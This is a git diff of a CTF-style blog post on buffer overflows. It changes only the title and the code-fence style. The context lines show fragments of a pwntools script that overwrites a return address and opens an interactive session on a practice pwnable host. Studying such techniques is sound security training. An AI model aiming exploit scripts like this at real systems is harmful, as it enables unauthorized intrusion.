@@ -1,5 +1,5 @@
 ---
-title: bof
+title: Buffer Overflow Attack
 author: janger
 date: 2023-09-25
 category: pwnables
@@ -29,7 +29,7 @@ p.interactive()
 
 **pwntools for Return Address Overwrite(x64)**
 
-```python3
+~~~ python
 from pwn import *
 
 p = remote('example.pwnable.io', 8000)
@@ -42,7 +42,7 @@ payload = dummy + sfp + ret
 
 p.send(payload)
 p.interactive()
-```
+~~~
 
 <br>
 
